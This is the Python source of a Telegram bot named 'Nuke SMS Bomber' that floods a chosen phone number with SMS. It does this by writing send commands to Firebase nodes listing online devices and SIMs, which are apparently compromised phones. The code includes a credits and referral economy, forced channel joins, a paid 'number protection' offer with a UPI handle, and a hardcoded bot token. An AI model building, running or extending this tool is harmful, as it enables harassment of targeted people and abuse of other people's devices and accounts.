# ════════════════════════════════════════════════════════════════════
#  botmain.py — Nuke SMS Bomber  v7.0
#  Fully hardened · Global error handler · Retry-aware · Cleaner UI
# ════════════════════════════════════════════════════════════════════
import asyncio, json, os, re, time, logging, secrets, signal, sys
from datetime import datetime
from io import BytesIO
from typing import Dict, List, Optional, Any
import aiohttp
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import (
    TelegramForbiddenError, TelegramBadRequest, TelegramRetryAfter,
    TelegramNetworkError, TelegramAPIError,
)
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import FSInputFile, BufferedInputFile

try:
    import qrcode
    QR_AVAILABLE = True
except ImportError:
    QR_AVAILABLE = False

# ════════════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("NukeBomber")
logging.getLogger("aiogram.event").setLevel(logging.WARNING)

# ════════════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════════════
BOT_TOKEN = "8941859116:AAF1S02-DNy-6QORLFzwXLgCCAZlynsEDxA"
OWNER_ID = 8679787798
DATA_FILE = "bomber_data.json"
BACKUP_DIR = "backups"
VERSION = "v7.0"

MAX_CONCURRENT = 200
DISPATCH_STAGGER = 0.003
RETRY_PER_SMS = 1
PROBE_CONCURRENCY = 400
HTTP_TOTAL_TIMEOUT = 10
HTTP_CONNECT_TIMEOUT = 4

WELCOME_CREDITS = 1000
REFERRAL_REWARD = 700

FORCE_JOIN_CHANNELS = ["@tchbsterarmy", "@errorarmy1"]

PROTECTION_PRICE = "10 Rs"
PAYMENT_UPI = "8707210511@fam"
PAYMENT_NAME = "SMS Bomber"

TG_MAX_LEN = 4000           # safe below 4096
HISTORY_LIMIT = 6           # channel protection from abuse
RATE_LIMIT_WINDOW = 20.0    # per-user callback rate (seconds)

# ════════════════════════════════════════════════════════════════════
# CUSTOM EMOJIS
# ════════════════════════════════════════════════════════════════════
CUSTOM_EMOJIS: Dict[str, tuple] = {
    "launch":       ("🎉", "6291743702679294478"),
    "task_done":    ("😁", "5337305337038909906"),
    "credit":       ("💳", "5445353829304387411"),
    "dashboard":    ("💓", "5256227233642605352"),
    "do_task":      ("🫡", "5460865799478593516"),
    "smm":          ("😈", "6292039222199063035"),
    "ai_support":   ("🤖", "5321100459790838211"),
    "my_orders":    ("👀", "5210956306952758910"),
    "share":        ("🫂", "6291721892835365542"),
    "join_updates": ("👀", "6298788673110410889"),
    "ig_button":    ("📱", "5319160079465857105"),
    "tg_button":    ("📱", "5330237710655306682"),
    "verify":       ("✅", "6084779072750097974"),
    "earn_credit":  ("➗", "5321506952675597305"),
    "back":         ("🔙", "5253997076169115797"),
    "cross":        ("❌", "5210952531676504517"),
    "blocked":      ("🚫", "5240241223632954241"),
    "delete":       ("🗑", "5445267414562389170"),
    "pin":          ("📌", "5397782960512444700"),
    "gift":         ("🎁", "6093890283227848557"),
    "premium":      ("💎", "5427168083074628963"),
    "crown":        ("👑", "6237864166879663987"),
    "referral":     ("📩", "5285184156555306745"),
    "money":        ("💵", "5321506952675597305"),
    "fire":         ("🔥", "6235628846855492222"),
    "star":         ("⭐", "6237702328216982810"),
    "bolt":         ("⚡", "5456140674028019486"),
    "top":          ("🔝", "5415655814079723871"),
    "bomb":         ("💣", "6235628846855492222"),
    "shield":       ("🛡️", "5427168083074628963"),
    "target":       ("🎯", "6235628846855492222"),
    "phone":        ("📞", "5319160079465857105"),
    "rocket":       ("🚀", "6291743702679294478"),
    "chart":        ("📊", "5210956306952758910"),
    "megaphone":    ("📢", "5285184156555306745"),
    "tools":        ("🛠️", "5445267414562389170"),
    "stop":         ("⏹", "5210952531676504517"),
    "info":         ("ℹ️", "5224596414415256150"),
}


def ce(key: str) -> str:
    if key not in CUSTOM_EMOJIS:
        return ""
    char, eid = CUSTOM_EMOJIS[key]
    return f'<tg-emoji emoji-id="{eid}">{char}</tg-emoji>'


def emoji_id(key: str) -> Optional[str]:
    return CUSTOM_EMOJIS.get(key, (None, None))[1]


_TG_EMOJI_STRIP = re.compile(r'<tg-emoji emoji-id="\d+">(.+?)</tg-emoji>', re.DOTALL)


def _strip_premium(text: str) -> str:
    return _TG_EMOJI_STRIP.sub(r"\1", text)


def _clip(text: str, limit: int = TG_MAX_LEN) -> str:
    if text and len(text) > limit:
        return text[:limit - 3] + "..."
    return text


# ════════════════════════════════════════════════════════════════════
# SAFE SEND / EDIT / ANSWER  (retry-aware, length-aware, stale-safe)
# ════════════════════════════════════════════════════════════════════
_EDIT_NOOP_ERRORS = (
    "message is not modified",
    "message to edit not found",
    "message can't be edited",
    "message identifier is not specified",
)


async def _retry_after_sleep(e: TelegramRetryAfter):
    wait = getattr(e, "retry_after", 3) + 0.5
    log.warning(f"Flood limit hit, sleeping {wait:.1f}s")
    await asyncio.sleep(wait)


async def safe_send(bot: Bot, chat_id: int, text: str,
                    reply_markup=None, disable_preview: bool = True) -> Optional[types.Message]:
    text = _clip(text)
    for attempt in range(3):
        try:
            return await bot.send_message(
                chat_id, text, reply_markup=reply_markup,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=disable_preview,
            )
        except TelegramRetryAfter as e:
            await _retry_after_sleep(e)
            continue
        except TelegramForbiddenError:
            log.info(f"User {chat_id} blocked the bot")
            return None
        except TelegramBadRequest as e:
            err = str(e).lower()
            if "can't parse entities" in err or "unsupported start tag" in err:
                # Retry without premium emojis
                try:
                    return await bot.send_message(
                        chat_id, _clip(_strip_premium(text)),
                        reply_markup=reply_markup, parse_mode=ParseMode.HTML,
                        disable_web_page_preview=disable_preview,
                    )
                except Exception as e2:
                    log.debug(f"safe_send strip retry failed: {e2}")
                    return None
            log.debug(f"safe_send bad request: {e}")
            return None
        except TelegramNetworkError as e:
            log.debug(f"safe_send network error attempt {attempt+1}: {e}")
            await asyncio.sleep(0.5 * (attempt + 1))
            continue
        except Exception as e:
            log.debug(f"safe_send unexpected: {e}")
            return None
    return None


async def safe_edit(bot: Bot, chat_id: int, msg_id: int, text: str,
                    reply_markup=None, disable_preview: bool = True) -> Optional[types.Message]:
    text = _clip(text)
    for attempt in range(3):
        try:
            return await bot.edit_message_text(
                text, chat_id=chat_id, message_id=msg_id,
                reply_markup=reply_markup, parse_mode=ParseMode.HTML,
                disable_web_page_preview=disable_preview,
            )
        except TelegramRetryAfter as e:
            await _retry_after_sleep(e)
            continue
        except TelegramBadRequest as e:
            err = str(e).lower()
            if any(s in err for s in _EDIT_NOOP_ERRORS):
                return None
            if "can't parse entities" in err or "unsupported start tag" in err:
                try:
                    return await bot.edit_message_text(
                        _clip(_strip_premium(text)),
                        chat_id=chat_id, message_id=msg_id,
                        reply_markup=reply_markup, parse_mode=ParseMode.HTML,
                        disable_web_page_preview=disable_preview,
                    )
                except Exception:
                    return None
            return None
        except TelegramNetworkError:
            await asyncio.sleep(0.5 * (attempt + 1))
            continue
        except Exception as e:
            log.debug(f"safe_edit unexpected: {e}")
            return None
    return None


async def safe_answer(cq: types.CallbackQuery, text: Optional[str] = None,
                      show_alert: bool = False):
    try:
        if text:
            await cq.answer(_clip(text, 190), show_alert=show_alert)
        else:
            await cq.answer()
    except TelegramRetryAfter as e:
        await _retry_after_sleep(e)
    except Exception as e:
        log.debug(f"safe_answer ignored: {e}")


async def safe_delete(bot: Bot, chat_id: int, msg_id: int):
    try:
        await bot.delete_message(chat_id, msg_id)
    except Exception:
        pass


# ════════════════════════════════════════════════════════════════════
# UI PRIMITIVES
# ════════════════════════════════════════════════════════════════════
SC_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ',
    'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ',
    'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
    'y': 'ʏ', 'z': 'ᴢ',
}
_SC_RE = re.compile(r'(<[^>]+>)')


def sc(text: str) -> str:
    if not isinstance(text, str):
        return str(text)
    parts = _SC_RE.split(text)
    for i in range(0, len(parts), 2):
        parts[i] = "".join(SC_MAP.get(c.lower(), c) for c in parts[i])
    return "".join(parts)


DIV = "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>"
DIV2 = "<b>────────────────────────</b>"


def B(t):  return f"<b>{t}</b>"
def C(t):  return f"<code>{t}</code>"
def It(t): return f"<i>{t}</i>"


def kv(label: str, value: str) -> str:
    """Renders one clean key/value line."""
    return f"  {label} · {value}"


def header(icon: str, title: str) -> str:
    """Top header used across panels."""
    return f"{DIV}\n{ce(icon)} {B(sc(title))}\n{DIV2}"


def footer(note: Optional[str] = None) -> str:
    return f"{DIV2}\n{It(sc(note))}\n{DIV}" if note else DIV


# ════════════════════════════════════════════════════════════════════
# BUTTON FACTORY
# ════════════════════════════════════════════════════════════════════
try:
    types.InlineKeyboardButton(text="t", callback_data="t", style="primary")
    STYLE_SUPPORTED = True
    log.info("✅ Styled buttons supported (Bot API 9.4+)")
except Exception:
    STYLE_SUPPORTED = False
    log.warning("⚠️ Styled buttons NOT supported")


def _make_btn(text: str, callback_data: Optional[str] = None, url: Optional[str] = None,
              style: str = "primary", emoji_key: Optional[str] = None):
    base: Dict[str, Any] = {"text": str(text)[:60]}
    if callback_data is not None:
        base["callback_data"] = callback_data
    if url is not None:
        base["url"] = url

    attempts = []
    full = dict(base)
    if style and STYLE_SUPPORTED:
        full["style"] = style
    eid = emoji_id(emoji_key) if emoji_key else None
    if eid and STYLE_SUPPORTED:
        full["icon_custom_emoji_id"] = eid
    attempts.append(full)

    if eid:
        a = dict(base)
        if style and STYLE_SUPPORTED:
            a["style"] = style
        attempts.append(a)

    if style and STYLE_SUPPORTED:
        b = dict(base); b["style"] = style; attempts.append(b)

    attempts.append(dict(base))

    for kwargs in attempts:
        try:
            return types.InlineKeyboardButton(**kwargs)
        except Exception:
            continue
    return types.InlineKeyboardButton(text=str(text)[:60], callback_data="noop")


def kb(rows) -> types.InlineKeyboardMarkup:
    keyboard = []
    for row in rows:
        btn_row = []
        for item in row:
            try:
                if isinstance(item, tuple):
                    text = item[0]
                    cb = item[1] if len(item) > 1 else None
                    style = item[2] if len(item) > 2 else "primary"
                    emoji = item[3] if len(item) > 3 else None
                    if isinstance(cb, str) and cb.startswith("http"):
                        btn_row.append(_make_btn(text, url=cb, style=style, emoji_key=emoji))
                    else:
                        btn_row.append(_make_btn(text, callback_data=cb, style=style, emoji_key=emoji))
                elif isinstance(item, dict):
                    btn_row.append(_make_btn(
                        item.get("text", ""),
                        callback_data=item.get("callback"),
                        url=item.get("url"),
                        style=item.get("style", "primary"),
                        emoji_key=item.get("emoji"),
                    ))
            except Exception as e:
                log.warning(f"kb() button error: {e}")
        if btn_row:
            keyboard.append(btn_row)
    return types.InlineKeyboardMarkup(inline_keyboard=keyboard)


def back_button(callback: str = "home", label: str = "back") -> types.InlineKeyboardMarkup:
    return kb([[(sc(label), callback, "danger", "back")]])


# ════════════════════════════════════════════════════════════════════
# FORCE JOIN
# ════════════════════════════════════════════════════════════════════
async def check_fj(bot: Bot, user_id: int, channels: List[str]) -> bool:
    if not channels:
        return True
    for ch in channels:
        try:
            m = await bot.get_chat_member(ch, user_id)
            if m.status in ("left", "kicked", None):
                return False
        except TelegramRetryAfter as e:
            await _retry_after_sleep(e)
            try:
                m = await bot.get_chat_member(ch, user_id)
                if m.status in ("left", "kicked", None):
                    return False
            except Exception:
                return False
        except Exception:
            return False
    return True


async def send_fj_ui(event, channels: List[str]):
    text = (
        f"{header('blocked', 'access locked')}"
        f"{sc('join the channels below, then tap')} {B(sc('check again'))} {sc('to continue.')}\n"
        f"{DIV2}\n"
    )
    rows = []
    for i, ch in enumerate(channels):
        text += f"{ce('pin')} {C(ch)}\n"
        url = f"https://t.me/{ch.replace('@', '')}"
        rows.append([(sc(f"join channel {i+1}"), url, "primary", "join_updates")])
    rows.append([(sc("check again"), "fj_verify", "success", "verify")])
    rows.append([(sc("restart"), "fj_restart", "danger", "back")])
    markup = kb(rows)

    if isinstance(event, types.Message):
        await safe_send(event.bot, event.chat.id, text, reply_markup=markup)
    else:
        if not await safe_edit(event.bot, event.message.chat.id,
                               event.message.message_id, text, reply_markup=markup):
            await safe_send(event.bot, event.message.chat.id, text, reply_markup=markup)


# ════════════════════════════════════════════════════════════════════
# FSM STATES
# ════════════════════════════════════════════════════════════════════
class Form(StatesGroup):
    fb_add_url = State()
    fb_add_api = State()
    bomb_number = State()
    bomb_message = State()
    bomb_count = State()
    protect_utr = State()
    protect_number = State()
    admin_ban = State()
    broadcast_msg = State()
    admin_credit_target = State()
    admin_credit_amount = State()
    redeem_code = State()
    admin_code_credits = State()
    admin_code_uses = State()


# ════════════════════════════════════════════════════════════════════
# STORAGE
# ════════════════════════════════════════════════════════════════════
def default_data() -> dict:
    return {
        "admins": [OWNER_ID],
        "firebases": [],
        "banned": [],
        "schedules": [],
        "protected_numbers": [],
        "protection_requests": [],
        "users": {},
        "redeem_codes": {},
        "stats": {"total_sent": 0, "total_failed": 0, "total_bombings": 0},
    }


def load() -> dict:
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                d = json.load(f)
            if not isinstance(d, dict):
                raise ValueError("root is not a dict")
            base = default_data()
            for k, v in base.items():
                if k not in d:
                    d[k] = v
            return d
    except Exception as e:
        log.error(f"load() error: {e} — using defaults")
    return default_data()


def save(d: dict):
    tmp = DATA_FILE + ".tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
        os.replace(tmp, DATA_FILE)
    except Exception as e:
        log.error(f"save() error: {e}")
        try:
            if os.path.exists(tmp):
                os.remove(tmp)
        except Exception:
            pass


def is_admin(uid: int, d: dict) -> bool:
    return uid in d.get("admins", []) or uid == OWNER_ID


def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])


def user_record(d: dict, uid: int) -> dict:
    users = d.setdefault("users", {})
    key = str(uid)
    if key not in users or not isinstance(users[key], dict):
        users[key] = {
            "credits": 0, "referrals": 0, "referred_by": 0,
            "username": "", "first_name": "",
            "joined": datetime.now().isoformat(), "is_new": True,
        }
    return users[key]


def get_credits(d: dict, uid: int) -> int:
    try:
        return int(d.get("users", {}).get(str(uid), {}).get("credits", 0))
    except Exception:
        return 0


def add_credits(d: dict, uid: int, amount: int) -> int:
    rec = user_record(d, uid)
    try:
        rec["credits"] = max(0, int(rec.get("credits", 0)) + int(amount))
    except Exception:
        rec["credits"] = 0
    return rec["credits"]


def credit_tier(credits: int) -> str:
    if credits >= 10000: return "ᴇʟɪᴛᴇ ᴏᴘᴇʀᴀᴛᴏʀ"
    if credits >= 3000:  return "ᴘʀᴏ ʙᴏᴍʙᴇʀ"
    if credits >= 1000:  return "ꜱᴛʀɪᴋᴇʀ"
    if credits >= 500:   return "ᴄᴀᴅᴇᴛ"
    if credits > 0:      return "ʀᴇᴄʀᴜɪᴛ"
    return "ɴᴏ ʀᴀɴᴋ"


# ════════════════════════════════════════════════════════════════════
# REDEEM CODES
# ════════════════════════════════════════════════════════════════════
_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"


def generate_redeem_code() -> str:
    return "BOMB-" + "".join(secrets.choice(_ALPHABET) for _ in range(5)) \
        + "-" + "".join(secrets.choice(_ALPHABET) for _ in range(5))


def normalize_code(raw: str) -> str:
    return (raw or "").strip().upper().replace(" ", "")


def redeem_code_for_user(d: dict, uid: int, raw_code: str):
    codes = d.setdefault("redeem_codes", {})
    code = normalize_code(raw_code)
    if code not in codes:
        return ("not_found", None)
    info = codes[code]
    used_by = list(info.get("used_by", []))
    if uid in used_by:
        return ("already_used", None)
    max_uses = int(info.get("max_uses", 0))
    if len(used_by) >= max_uses:
        return ("exhausted", None)
    credits = int(info.get("credits", 0))
    add_credits(d, uid, credits)
    used_by.append(uid)
    info["used_by"] = used_by
    codes[code] = info
    return ("ok", credits)


def create_redeem_code_record(d: dict, credits: int, max_uses: int, admin_id: int) -> str:
    codes = d.setdefault("redeem_codes", {})
    code = generate_redeem_code()
    while code in codes:
        code = generate_redeem_code()
    codes[code] = {
        "credits": int(credits),
        "max_uses": int(max_uses),
        "used_by": [],
        "created_at": datetime.now().isoformat(),
        "created_by": admin_id,
    }
    return code


# ════════════════════════════════════════════════════════════════════
# HTTP SESSION
# ════════════════════════════════════════════════════════════════════
_http_session: Optional[aiohttp.ClientSession] = None
_session_lock = asyncio.Lock()


async def get_session() -> aiohttp.ClientSession:
    global _http_session
    async with _session_lock:
        if _http_session is None or _http_session.closed:
            connector = aiohttp.TCPConnector(
                limit=2000, limit_per_host=800,
                ttl_dns_cache=900, keepalive_timeout=90,
                enable_cleanup_closed=True, force_close=False,
            )
            _http_session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(
                    total=HTTP_TOTAL_TIMEOUT, connect=HTTP_CONNECT_TIMEOUT),
            )
        return _http_session


async def close_session():
    global _http_session
    try:
        if _http_session and not _http_session.closed:
            await _http_session.close()
    except Exception:
        pass
    _http_session = None


# ════════════════════════════════════════════════════════════════════
# FIREBASE
# ════════════════════════════════════════════════════════════════════
async def fb_get(base: str, path: str, api_key: str = "") -> dict:
    url = base.rstrip("/") + path
    if api_key:
        url += f"?auth={api_key}"
    try:
        session = await get_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as r:
            if r.status == 200:
                txt = await r.text()
                if txt in ("null", ""):
                    return {}
                data = json.loads(txt)
                return data if isinstance(data, dict) else {}
    except Exception as e:
        log.debug(f"fb_get error {base}: {e}")
    return {}


async def fb_put(base: str, path: str, payload: dict, api_key: str = "") -> bool:
    url = base.rstrip("/") + path
    if api_key:
        url += f"?auth={api_key}"
    for attempt in range(1 + RETRY_PER_SMS):
        try:
            session = await get_session()
            async with session.put(
                url, json=payload,
                timeout=aiohttp.ClientTimeout(total=8),
            ) as r:
                if 200 <= r.status < 300:
                    return True
        except Exception as e:
            log.debug(f"fb_put attempt {attempt+1} error: {e}")
        if attempt < RETRY_PER_SMS:
            await asyncio.sleep(0.2)
    return False


# ════════════════════════════════════════════════════════════════════
# BOMB ENGINE
# ════════════════════════════════════════════════════════════════════
def is_device_online(device_data: dict) -> bool:
    if not isinstance(device_data, dict):
        return False
    for flag in ("isOnline", "online", "connected", "status"):
        v = device_data.get(flag)
        if v in (True, 1, "online", "active", "true"):
            return True
    return False


async def discover_online_devices(fb: dict) -> List[dict]:
    data = await fb_get(fb["url"], "/clients.json", fb.get("api_key", ""))
    if not data or not isinstance(data, dict):
        return []
    devices = []
    for device_id, device_data in data.items():
        if not is_device_online(device_data):
            continue
        sims = device_data.get("sims") or []
        if not sims:
            sims = [{"simSlotIndex": 0, "phoneNumber": device_data.get("phoneNumber", "")}]
        for sim in sims:
            devices.append({
                "fb_id": fb["id"], "fb_url": fb["url"], "api_key": fb.get("api_key", ""),
                "device_id": device_id,
                "device_name": device_data.get("deviceName", device_id),
                "sim_slot": sim.get("simSlotIndex", 0),
                "phone_number": sim.get("phoneNumber", ""),
                "battery": device_data.get("battery", 0),
            })
    return devices


async def discover_all_devices(firebases: List[dict]) -> List[dict]:
    if not firebases:
        return []
    sem = asyncio.Semaphore(PROBE_CONCURRENCY)

    async def _probe(fb):
        async with sem:
            try:
                return await discover_online_devices(fb)
            except Exception as e:
                log.debug(f"probe failed for {fb.get('url')}: {e}")
                return []

    results = await asyncio.gather(*(_probe(fb) for fb in firebases),
                                   return_exceptions=True)
    out: List[dict] = []
    for res in results:
        if isinstance(res, list):
            out.extend(res)
    return out


async def send_single_sms(device: dict, to: str, message: str) -> bool:
    payload = {
        "from": device["sim_slot"], "to": to.strip(), "message": message.strip(),
        "isSended": False, "timestamp": int(time.time()),
        "deviceId": device["device_id"], "simSlot": device["sim_slot"],
    }
    path = f"/clients/{device['device_id']}/webhookEvent/sendSms.json"
    return await fb_put(device["fb_url"], path, payload, device.get("api_key", ""))


_bombing_tasks: Dict[int, asyncio.Task] = {}
_bombing_status: Dict[int, dict] = {}
_worker_lock = asyncio.Lock()


def _progress_bar(done: int, total: int, length: int = 15) -> str:
    filled = int(length * done / max(1, total))
    return "█" * filled + "░" * (length - filled)


async def bomber_worker(bot: Bot, user_id: int, number: str, message: str,
                        requested_count: int, schedule_id: Optional[str] = None):
    try:
        d = load()
        firebases = d.get("firebases", [])
        if not firebases:
            await safe_send(bot, user_id, f"{header('cross', 'no firebase nodes configured')}{sc('contact admin.')}")
            return

        credits = get_credits(d, user_id)
        if credits <= 0:
            await safe_send(bot, user_id,
                f"{header('blocked', 'insufficient credits')}"
                f"{sc('you have')} {C('0 credits')} {sc('— need at least 1 to send an sms.')}\n"
                f"{sc('use')} {B(sc('redeem credits'))} {sc('or invite friends via')} {B(sc('refer & earn'))}.")
            return

        effective_count = min(requested_count, credits)
        capped_by_credits = effective_count < requested_count

        status_msg = await safe_send(bot, user_id,
            f"{header('bomb', 'scanning firebase grid')}"
            f"{ce('fire')} {sc('probing')} {B(str(len(firebases)))} {sc('nodes for online devices...')}")
        if not status_msg:
            return
        msg_id = status_msg.message_id

        all_devices = await discover_all_devices(firebases)
        device_count = len(all_devices)

        if device_count == 0:
            await safe_edit(bot, user_id, msg_id,
                f"{header('cross', 'no online devices')}"
                f"{sc('none of the')} {C(str(len(firebases)))} {sc('nodes have an online device right now.')}\n"
                f"{sc('try again in a moment.')}")
            return

        per_device_base = effective_count // device_count
        remainder = effective_count % device_count
        devices_reused = per_device_base > 1

        notes = []
        if capped_by_credits:
            notes.append(
                f"{ce('info')} {sc('capped by your credits — only')} {B(str(credits))} "
                f"{sc('sms can be sent (you requested')} {C(str(requested_count))}{sc(').')}"
            )
        if devices_reused:
            notes.append(
                f"{ce('info')} {sc('only')} {B(str(device_count))} "
                f"{sc('devices online — each will send ~')} "
                f"{B(str(per_device_base + (1 if remainder else 0)))} {sc('sms.')}"
            )
        note_block = ("\n" + "\n".join(notes)) if notes else ""

        await safe_edit(bot, user_id, msg_id,
            f"{header('bomb', 'bombing started')}"
            f"{ce('phone')} {sc('devices online')} · {B(str(device_count))}\n"
            f"{ce('target')} {sc('target')} · {C(number)}\n"
            f"{ce('bolt')} {sc('sending')} · {B(str(effective_count))} {sc('sms')}"
            f"{note_block}")

        device_idx_counter = {"i": 0}
        idx_lock = asyncio.Lock()

        async def _next_device() -> dict:
            async with idx_lock:
                dev = all_devices[device_idx_counter["i"] % device_count]
                device_idx_counter["i"] += 1
                return dev

        sent = 0
        failed = 0
        start_time = time.time()
        semaphore = asyncio.Semaphore(MAX_CONCURRENT)
        counters_lock = asyncio.Lock()

        _bombing_status[user_id] = {
            "total": effective_count, "sent": 0, "failed": 0,
            "devices": device_count, "start": start_time,
            "running": True, "number": number,
        }

        async def progress_loop():
            while _bombing_status.get(user_id, {}).get("running"):
                await asyncio.sleep(2.0)
                done = sent + failed
                pct = int(done / effective_count * 100) if effective_count else 0
                bar = _progress_bar(done, effective_count)
                elapsed = int(time.time() - start_time)
                rate = round(done / elapsed, 1) if elapsed > 0 else 0
                try:
                    await safe_edit(bot, user_id, msg_id,
                        f"{header('bomb', 'bombing in progress')}"
                        f"{ce('phone')} {sc('target')} · {C(number)}\n"
                        f"{ce('verify')} {sc('sent')} · {B(str(sent))}   "
                        f"{ce('cross')} {sc('failed')} · {B(str(failed))}\n"
                        f"{ce('chart')} {C(bar)}  {B(str(pct) + '%')}\n"
                        f"{ce('bolt')} {sc('rate')} · {C(str(rate) + ' sms/s')}   "
                        f"{sc('elapsed')} · {C(str(elapsed) + 's')}\n"
                        f"{DIV2}\n{It(sc('use /stop to cancel anytime'))}")
                except Exception:
                    pass

        progress_task = asyncio.create_task(progress_loop())

        async def worker(idx: int):
            nonlocal sent, failed
            async with semaphore:
                task = _bombing_tasks.get(user_id)
                if task is None or task.cancelled():
                    return
                device = await _next_device()
                try:
                    ok = await send_single_sms(device, number, message)
                except Exception as e:
                    log.debug(f"send exception: {e}")
                    ok = False
                async with counters_lock:
                    if ok:
                        sent += 1
                    else:
                        failed += 1
                    st = _bombing_status.get(user_id)
                    if st:
                        st["sent"] = sent
                        st["failed"] = failed

        async def launcher():
            tasks = []
            for i in range(effective_count):
                task = _bombing_tasks.get(user_id)
                if task is None or task.cancelled():
                    break
                tasks.append(asyncio.create_task(worker(i)))
                await asyncio.sleep(DISPATCH_STAGGER)
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

        await launcher()

        _bombing_status.setdefault(user_id, {})["running"] = False
        progress_task.cancel()
        try:
            await progress_task
        except Exception:
            pass

        used = sent + failed
        d = load()
        add_credits(d, user_id, -used)
        new_balance = get_credits(d, user_id)
        stats = d.setdefault("stats", {})
        stats["total_sent"] = stats.get("total_sent", 0) + sent
        stats["total_failed"] = stats.get("total_failed", 0) + failed
        stats["total_bombings"] = stats.get("total_bombings", 0) + 1
        save(d)

        rate = round((sent / used) * 100, 1) if used else 0
        total_elapsed = int(time.time() - start_time)

        await safe_edit(bot, user_id, msg_id,
            f"{DIV}\n"
            f"{ce('task_done')} {B(sc('bombing completed'))} {ce('launch')}\n"
            f"{DIV2}\n"
            f"{ce('phone')} {sc('target')} · {C(number)}\n"
            f"{ce('verify')} {sc('sent')} · {B(str(sent))}\n"
            f"{ce('cross')} {sc('failed')} · {B(str(failed))}\n"
            f"{ce('bolt')} {sc('time')} · {C(str(total_elapsed) + 's')}\n"
            f"{ce('chart')} {sc('success rate')} · {B(str(rate) + '%')}\n"
            f"{DIV2}\n"
            f"{ce('credit')} {sc('credits used')} · {C(str(used))}\n"
            f"{ce('money')} {sc('remaining balance')} · {C(str(new_balance) + ' credits')}\n"
            f"{DIV}")
    except asyncio.CancelledError:
        try:
            _bombing_status.setdefault(user_id, {})["running"] = False
        except Exception:
            pass
        raise
    except Exception as e:
        log.exception(f"bomber_worker fatal: {e}")
        try:
            await safe_send(bot, user_id,
                f"{header('cross', 'bombing failed')}{sc('please try again later.')}")
        except Exception:
            pass
    finally:
        _bombing_tasks.pop(user_id, None)
        st = _bombing_status.get(user_id)
        if st:
            st["running"] = False


async def start_bombing(bot: Bot, user_id: int, number: str, message: str, count: int):
    async with _worker_lock:
        if user_id in _bombing_tasks:
            try:
                _bombing_tasks[user_id].cancel()
            except Exception:
                pass
            await asyncio.sleep(0.3)
        task = asyncio.create_task(
            bomber_worker(bot, user_id, number, message, count))
        _bombing_tasks[user_id] = task
        return task


def stop_bombing(user_id: int) -> bool:
    if user_id in _bombing_tasks:
        try:
            _bombing_tasks[user_id].cancel()
        except Exception:
            pass
        _bombing_tasks.pop(user_id, None)
        return True
    return False


# ════════════════════════════════════════════════════════════════════
# KEYBOARDS — cleaned layout
# ════════════════════════════════════════════════════════════════════
def main_menu(uid: int, d: dict) -> types.InlineKeyboardMarkup:
    rows = []
    if is_admin(uid, d):
        rows.append([(sc("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ"), "admin:panel", "primary", "crown")])
    rows.append([(sc("ᴛᴀʀɢᴇᴛ ʙᴏᴍʙɪɴɢ"), "bomb:start", "danger", "bomb")])
    rows.append([
        (sc("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ"), "protect:start", "success", "shield"),
        (sc("ʀᴇᴅᴇᴇᴍ ᴄʀᴇᴅɪᴛs"), "redeem:start", "success", "gift"),
    ])
    rows.append([
        (sc("ᴍʏ sᴛᴀᴛs"), "stats:show", "primary", "chart"),
        (sc("ʀᴇꜰᴇʀ & ᴇᴀʀɴ"), "referral:show", "success", "referral"),
    ])
    rows.append([(sc("ʜᴇʟᴘ"), "help:show", "primary", "ai_support")])
    return kb(rows)


def admin_panel_kb(d: dict) -> types.InlineKeyboardMarkup:
    pending_reqs = len([r for r in d.get("protection_requests", [])
                        if r.get("status") == "pending"])
    return kb([
        [(sc("ᴀᴅᴅ ꜰɪʀᴇʙᴀsᴇ"), "admin:fb_add", "success", "bolt"),
         (sc("ʟɪsᴛ ɴᴏᴅᴇs"), "admin:fb_list", "primary", "pin")],
        [(sc(f"ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ({pending_reqs})"), "admin:protection", "primary", "shield")],
        [(sc("sᴛᴀᴛs"), "admin:stats", "primary", "chart"),
         (sc("ʙʀᴏᴀᴅᴄᴀsᴛ"), "admin:broadcast", "success", "megaphone")],
        [(sc("ᴍᴀɴᴀɢᴇ ᴄʀᴇᴅɪᴛs"), "admin:credits", "primary", "credit")],
        [(sc("ᴄʀᴇᴀᴛᴇ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ"), "admin:create_code", "success", "gift")],
        [(sc("ᴀᴅᴍɪɴs"), "admin:admins", "primary", "crown"),
         (sc("ᴅᴀᴛᴀʙᴀsᴇ"), "admin:db_tools", "primary", "tools")],
        [(sc("ʙᴀɴ ᴜsᴇʀ"), "admin:ban", "danger", "blocked"),
         (sc("ᴜɴʙᴀɴ ᴜsᴇʀ"), "admin:unban", "success", "verify")],
        [(sc("ʙᴀᴄᴋ"), "home", "danger", "back")],
    ])


# ════════════════════════════════════════════════════════════════════
# QR
# ════════════════════════════════════════════════════════════════════
